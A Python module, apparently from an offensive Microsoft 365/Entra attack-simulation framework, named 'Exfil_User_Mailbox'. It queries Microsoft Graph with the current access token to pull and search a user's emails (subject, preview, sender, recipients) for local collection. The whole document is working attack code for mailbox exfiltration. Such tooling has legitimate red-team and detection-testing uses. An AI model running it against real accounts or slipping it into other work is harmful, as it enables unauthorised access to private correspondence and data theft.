'''
Module Name: Exfil_User_Mailbox
Module Description: Exfiltrate emails locally from users mailbox
Reference: https://learn.microsoft.com/en-us/graph/search-query-parameter?tabs=http
'''
from core.GraphFunctions import graph_get_request

def TechniqueMain(search_field = None, search_term = None):

    search_field_options = ['body','subject','attachment','from']
    endpoint_url = 'https://graph.microsoft.com/v1.0/me/messages?$select=id,from,toRecipients,subject,bodyPreview'
    
    if search_term != None:
        endpoint_url = f'https://graph.microsoft.com/v1.0/me/messages?$search="{search_term}"&$select=id,from,toRecipients,subject,bodyPreview'

        if search_field != None and search_term != None:
            endpoint_url = f'https://graph.microsoft.com/v1.0/me/messages?$search="{search_field}:{search_term}"&$select=id,from,toRecipients,subject,bodyPreview'

    try:
        # get emails from users mailbox
        raw_response = graph_get_request(url = endpoint_url)

        if 'error' in raw_response:
            return False, {"Error" : raw_response.get('error').get('message', 'N/A')}, None

        # parse raw response => pretty response
        try:
            # create pretty response
            pretty_response = {}

            if raw_response == []:
                return pretty_response
            
            email_count = 0
            for email in raw_response:

                # checking keys for inconsistent data in returned emails
                if 'subject' in email.keys():
                    subject = email.get('subject', 'N/A')
                else:
                    subject = 'N/A'
                if 'bodyPreview' in email.keys():
                    body_preview = email.get('bodyPreview', 'N/A')
                else:
                    body_preview = 'N/A'
                if 'from' in email.keys():
                    sender = f"{email.get('from', 'N/A').get('emailAddress').get('name', 'N/A')} - {email.get('from', 'N/A').get('emailAddress').get('address', 'N/A')}"
                else:
                    sender = 'N/A'
                if 'toRecipients' in email.keys():
                    recipient = email.get('toRecipients', 'N/A')
                else:
                    recipient = 'N/A'
                
                # email counter
                email_count += 1

                # email key in response is "Email_Counter" for unique key
                pretty_response[f"Email_{email_count}"] = {
                    'Subject' : subject,
                    'Body Preview' : body_preview,
                    'From (Sender)' : sender,
                    'To (Recipient)' : recipient
                }

            return True, raw_response, pretty_response
        except Exception as e:
            # return only raw response if pretty response fails
            return True, raw_response, None
        
    except Exception as e:
        return False, {"Error" : e}, None



def TechniqueInputSrc() -> list:
    '''Returns the input fields required as parameters for the technique execution'''
    return []